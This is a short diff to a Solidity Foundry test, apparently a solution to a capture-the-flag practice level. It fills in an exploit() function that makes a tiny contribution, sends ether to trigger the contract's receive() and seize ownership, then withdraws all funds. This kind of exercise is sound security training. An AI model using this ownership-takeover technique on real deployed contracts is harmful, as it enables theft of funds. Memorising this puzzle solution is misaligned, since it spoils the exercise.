@@ -16,12 +16,15 @@ contract FallbackTest is Test {
 
     function exploit() internal {
         vm.startPrank(student);
-        
+
         // Contribute a small amount (less than 0.001 ether) to the contract
+	fallbackContract.contribute{value: 0.0009 ether}();
 
         // Send ether to the contract trigger receive() and become the owner
+	address(fallbackContract).call{value: 0.1 ether}("");
 
         // Withdraw all funds
+	fallbackContract.withdraw();
 
         vm.stopPrank();
     }
